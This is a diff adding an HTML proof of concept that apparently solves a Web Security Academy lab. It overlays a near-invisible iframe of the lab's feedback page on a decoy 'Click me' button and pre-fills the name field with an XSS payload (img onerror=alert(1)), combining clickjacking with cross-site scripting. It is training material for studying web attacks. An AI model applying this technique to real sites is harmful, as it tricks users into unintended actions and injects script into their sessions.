@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        #target_website {
+            position: relative;
+            width: 1000px;
+            height: 700px;
+            opacity: 0.00001;
+            z-index: 2;
+        }
+        
+        .decoy_content {
+            position: absolute;
+            top: 520px;
+            left: 60px;
+            z-index: 1;
+        }
+        
+        .decoy_content button {
+            background-color: #008CBA;
+            color: white;
+            padding: 10px 24px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="decoy_content">
+        <button>Click me</button>
+    </div>
+    <iframe id="target_website" src="https://0a3900c304b67111838b512800a90077.web-security-academy.net/feedback?name=<img src=x onerror=alert(1)>&email=test@test.com&subject=test&message=test"></iframe>
+</body>
+</html>
